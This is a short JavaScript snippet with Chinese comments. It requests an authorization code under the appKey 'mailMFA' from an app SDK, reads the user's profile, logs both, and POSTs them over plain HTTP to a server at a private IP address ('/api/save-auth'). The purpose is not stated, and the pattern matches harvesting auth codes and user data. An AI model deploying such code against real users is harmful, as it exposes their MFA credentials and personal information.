(function () {
    // 存储合并数据的对象
    let combinedData = {};

    // 发起 requestAuthCode 调用
    jmeSdk.default.requestAuthCode({
        "appKey": "mailMFA",
        success(res) {
            console.log("Auth code success:", JSON.stringify(res));
            combinedData.authCode = res;

            // 直接调用 getUserInfo，假设它返回数据
            try {
                const userInfo = jme.user.getUserInfo();
                console.log("User info result:", JSON.stringify(userInfo));
                combinedData.userInfo = userInfo || {}; // 防止 userInfo 为 undefined

                // 合并完成，发送到后端
                console.log("Combined data:", JSON.stringify(combinedData));
                fetch('http://192.168.0.178:5000/api/save-auth', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(combinedData)
                })
                .then(response => response.json())
                .then(data => console.log("Server response:", data))
                .catch(error => console.error("Error sending data:", error));
            } catch (error) {
                console.error("User info error:", error.message);
                // 如果 getUserInfo 失败，仍发送 authCode 数据
                console.log("Sending partial data (only authCode):", JSON.stringify(combinedData));
                fetch('http://192.168.0.178:5000/api/save-auth', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(combinedData)
                })
                .then(response => response.json())
                .then(data => console.log("Server response (partial):", data))
                .catch(error => console.error("Error sending partial data:", error));
            }
        },
        fail(res) {
            console.error("Auth code failed:", JSON.stringify(res));
            console.log("Auth code failed, no data sent to server");
        },
        complete() {
            console.log("requestAuthCode done");
        }
    });
})();
